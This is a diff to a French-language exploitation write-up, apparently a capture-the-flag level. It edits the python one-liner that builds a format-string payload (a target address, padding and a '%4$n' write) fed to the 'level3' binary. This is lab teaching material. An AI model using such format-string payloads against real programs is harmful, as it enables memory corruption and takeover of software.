@@ -144,7 +144,7 @@ Si on exécutait `gdb` avec une commande comme celle ci, on obtiendrais un résu
 ```
 Nous utilisons `python` pour formatter notre input :
 ```
-python -c 'print("\x8c\x98\x04\x08" + "A"*60 + "%4\$n")' > /tmp/input
+python -c 'print("\x8c\x98\x04\x08" + "A"*60 + "%4$n")' > /tmp/input
 ```
 Puis nous injectons notre input dans `level3` :
 ```
